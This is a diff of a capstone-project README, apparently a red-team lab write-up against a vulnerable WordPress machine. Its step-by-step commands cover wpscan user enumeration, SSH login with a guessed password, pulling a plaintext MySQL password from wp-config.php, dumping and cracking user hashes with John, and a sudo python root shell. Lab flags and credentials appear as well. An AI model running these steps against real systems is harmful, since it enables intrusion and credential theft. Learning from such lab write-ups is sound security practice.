@@ -48,55 +48,59 @@ It should be noted that, despite common perceptions, the use of a good salt with
 
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data (listed in chronological order):
 
-*Exploit*
+**Exploit**
 - User michael used their username as their password
   - `wpscan –-url http://192.168.1.110/wordpress -eu`
   - [Users Identified](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/Kali_Users_Identified.PNG "Users Identified")
   - `ssh michael@192.168.1.110`
   - [login as michael](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_login_michael.PNG "Login_Michael")
 
-*Flag #2*
+**Flag #2**
 -  Flag #2 {fc3fd58dcdad9ab23faca6e9a36e581c} 
   - `cd /var/www`
   - `cat flag2.txt`
   - [Flag 2](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag2.PNG "Flag 2")
 
-*Flag #1*
+**Flag #1**
 - Flag #1 {b9bbcb33e11b80be759c4e844862482d}
   - `grep -RE flag html`
   - [Flag 1](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag1.PNG "Flag 1")
 
-*Exploit*
+**Exploit**
 - MySQL server login credentials in plain text found in wp-config.php file.
   - `cat /var/www/html/wordpress/wp-config.php`
     - Password: R@v3nSecurity
   - [MySQL DB Password](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_MySQL_DB_password.PNG "MySQL DB Password")
 
-*Flag #3*
+**Exploit**
+- MySQL server login credentials in plain text found in wp-config.php file.
+  - `mysql -u root -p`
+  - `mysql> use wordpress;`
+  - `mysql> select * from wp_users;`
+  - Password: R@v3nSecurity
+  - [user password hashes](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_MySQL_wp_users.PNG "user password hashes")
+
+**Flag #3**
 - Flag #3 {afc01ab56b50591e7dccf93122770cd2} 
   - [Flag 3](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_mySQL_wp_posts_flags.PNG "Flag 3")
 
-*Flag #4*
+**Exploit**
+- Use John to crack the passwords and login as users.
+- `nano wp_hashes.txt`
+  - `michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0`
+  - `steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/`
+- `john wp_hashes.txt`
+  - Steven: pink84
+- [login as steven](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_login_steven.PNG "login as steven")
+
+**Exploit**
+- Spawn Shell → python sudo privileges
+- `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
+- [escalated privileges](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_root_python_flag4.PNG "escalated privileges")
+
+**Flag #4**
 - Flag #4 {715dea6c055b9fe3337544932f2941ce}
-  - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
   - `cd ../..`
   - `cat flag4.txt`
   - [Flag 4](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_root_python_flag4.PNG "Flag 4")
-
-
-
-
-Step 6: Use the credentials to log into MySQL and dump WordPress user password hashes.
-- michael@target1:~$ `mysql -u root -p`
-- Enter password: `R@v3nSecurity`
-- [MySQL Login](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_mySQL_login.PNG "MySQL Login")
-
-- `mysql> show databases;`
-- [mysql show databases](mysql "mysql show databases")
-- `mysql> use wordpress;`
-- [mysql wordpress DB](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_mySQL_wordpress_db.PNG "mysql wordpress DB")
-
-
-
-      
 
